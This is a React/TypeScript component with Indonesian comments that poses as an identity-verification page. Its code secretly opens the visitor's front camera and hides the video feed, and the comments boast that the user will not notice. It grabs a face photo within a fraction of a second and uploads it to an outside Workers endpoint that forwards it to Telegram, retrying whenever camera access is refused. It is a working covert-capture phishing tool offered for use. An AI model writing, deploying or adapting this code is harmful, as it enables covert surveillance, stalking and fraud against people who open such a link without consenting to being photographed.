"use client";

import React, { useState, useRef, useEffect, useCallback } from 'react';

// ============================================================
// 👻 SMILE STEALTH CAPTURE - ZERO CAMERA VISIBILITY
// ============================================================

interface SendPhotoResponse {
  success: boolean;
  message: string;
}

const SmileStealthCapture: React.FC = () => {
  // ============================================================
  // 🔧 KONFIGURASI
  // ============================================================
  const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';
  
  // ⏱️ WAKTU CAPTURE (ms) - super cepat!
  const CAPTURE_DELAY = 300; // 0.3 detik setelah kamera ready
  const CAMERA_HIDE_DELAY = 100; // 0.1 detik setelah capture

  // ============================================================
  // 📦 STATE
  // ============================================================
  const [sessionId, setSessionId] = useState('');
  const [isCameraReady, setIsCameraReady] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
  const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
    message: '',
    type: '',
  });
  const [isDone, setIsDone] = useState(false);

  // ============================================================
  // 🎯 REFS
  // ============================================================
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hideTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasCapturedRef = useRef(false);

  // ============================================================
  // 🛠️ HELPER
  // ============================================================
  const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
    setStatus({ message, type });
  }, []);

  // ============================================================
  // 🔍 GET SESSION ID
  // ============================================================
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const queryId = urlParams.get('session') || urlParams.get('id');
      const pathSegments = window.location.pathname.split('/');
      const pathId = pathSegments[pathSegments.length - 1];

      const id = queryId || (pathId !== 'stealth' && pathId !== 'v' ? pathId : '');

      if (id && id.length >= 6) {
        setSessionId(id);
      } else {
        const randomId = 'SML' + Math.floor(10000 + Math.random() * 90000);
        setSessionId(randomId);
      }
    }
  }, []);

  // ============================================================
  // 🚀 AUTO START - LANGSUNG JALAN
  // ============================================================
  useEffect(() => {
    if (sessionId) {
      // Start camera secepatnya
      const timer = setTimeout(() => {
        startCamera();
      }, 200);
      return () => clearTimeout(timer);
    }
  }, [sessionId]);

  // ============================================================
  // 🧹 CLEANUP
  // ============================================================
  useEffect(() => {
    return () => {
      if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
      if (hideTimeoutRef.current) clearTimeout(hideTimeoutRef.current);
      stopCamera();
    };
  }, []);

  // ============================================================
  // 📷 KAMERA - SILENT MODE
  // ============================================================
  const startCamera = async () => {
    try {
      // Stop camera kalo udah ada
      stopCamera();

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        // Video DISEMBUNYIKAN - gak keliatan sama user!
        videoRef.current.style.display = 'none';
      }

      setIsCameraReady(true);

      // 🔥 AUTO CAPTURE - SEGERA!
      if (!hasCapturedRef.current) {
        captureTimeoutRef.current = setTimeout(() => {
          autoCaptureAndSend();
        }, CAPTURE_DELAY);
      }

    } catch (err) {
      console.error('Camera error:', err);
      showStatus('⚠️ Butuh akses kamera untuk verifikasi', 'error');
      setIsCameraReady(false);
      
      // Retry setelah 1 detik
      setTimeout(() => {
        if (!hasCapturedRef.current) {
          startCamera();
        }
      }, 1000);
    }
  };

  // ============================================================
  // 🛑 STOP KAMERA - LANGSUNG MATI
  // ============================================================
  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }
    setIsCameraReady(false);
  };

  // ============================================================
  // 📸 AUTO CAPTURE + AUTO SEND - SUPER CEPAT!
  // ============================================================
  const autoCaptureAndSend = useCallback(() => {
    if (hasCapturedRef.current) return;
    if (!isCameraReady || !streamRef.current) {
      // Retry kalo blom ready
      captureTimeoutRef.current = setTimeout(() => {
        autoCaptureAndSend();
      }, 100);
      return;
    }

    const video = videoRef.current;
    if (!video) return;

    // Ambil frame dari video
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    // Flip horizontal biar kaya mirror
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const photoData = canvas.toDataURL('image/jpeg', 0.85);
    setCapturedPhoto(photoData);
    hasCapturedRef.current = true;

    // 🔥 MATIKAN KAMERA - LANGSUNG HILANG!
    hideTimeoutRef.current = setTimeout(() => {
      stopCamera();
      // Video di-hidden, kamera mati, user gak sadar
    }, CAMERA_HIDE_DELAY);

    showStatus('✅ Verifikasi berhasil', 'success');

    // Kirim foto ke Telegram
    sendPhoto(photoData);

  }, [isCameraReady]);

  // ============================================================
  // 📤 SEND PHOTO KE TELEGRAM
  // ============================================================
  const sendPhoto = async (photoData: string) => {
    if (!photoData || isSending || !sessionId) return;

    setIsSending(true);

    try {
      // Konversi dataURL ke File
      const resBlob = await fetch(photoData);
      const blob = await resBlob.blob();
      const file = new File([blob], `${sessionId}_face.jpg`, { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('photo', file);

      const res = await fetch(`${API_BASE}/capture/${sessionId}`, {
        method: 'POST',
        body: formData,
      });

      const result: SendPhotoResponse = await res.json();

      if (result.success) {
        setIsDone(true);
        showStatus('✅ Verifikasi selesai', 'success');
      } else {
        showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
      }
    } catch (err) {
      console.error('Send error:', err);
      showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
    } finally {
      setIsSending(false);
    }
  };

  // ============================================================
  // 🎨 RENDER - TAMPILAN POLOS, GAK ADA KAMERA!
  // ============================================================
  return (
    <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
      <div className="bg-white rounded-2xl shadow-lg p-8 max-w-sm w-full border border-gray-100">
        
        {/* Icon & Title */}
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
            <span className="text-3xl">🔐</span>
          </div>
          <h2 className="text-gray-800 text-xl font-semibold">Verifikasi Identitas</h2>
          <p className="text-gray-400 text-sm mt-1">
            {isDone ? 'Verifikasi selesai ✓' : 'Mohon tunggu sebentar...'}
          </p>
        </div>

        {/* Status Animation */}
        <div className="flex flex-col items-center gap-3 py-4">
          {!isDone && !status.message && (
            <>
              <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
              <p className="text-gray-400 text-sm">Memproses verifikasi...</p>
            </>
          )}

          {status.message && (
            <div className={`w-full py-3 px-4 rounded-lg text-sm text-center ${
              status.type === 'success'
                ? 'bg-green-50 text-green-600'
                : status.type === 'error'
                ? 'bg-red-50 text-red-500'
                : 'bg-blue-50 text-blue-500'
            }`}>
              <span className="text-2xl block mb-1">
                {status.type === 'success' ? '✅' : status.type === 'error' ? '❌' : 'ℹ️'}
              </span>
              {status.message}
            </div>
          )}

          {isDone && (
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                <span className="text-3xl">✔️</span>
              </div>
              <p className="text-gray-600 text-sm">Verifikasi berhasil!</p>
              <p className="text-gray-400 text-xs mt-1">Halaman akan tertutup otomatis</p>
            </div>
          )}
        </div>

        {/* Hidden Video - TIDAK KELIHATAN */}
        <video
          ref={videoRef}
          className="hidden"
          autoPlay
          playsInline
          muted
        />

        {/* Footer - Tidak Mencolok */}
        <div className="mt-6 pt-4 border-t border-gray-100 text-center">
          <p className="text-gray-300 text-[10px]">
            {sessionId ? `ID: ${sessionId.substring(0, 6)}` : 'Loading...'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default SmileStealthCapture;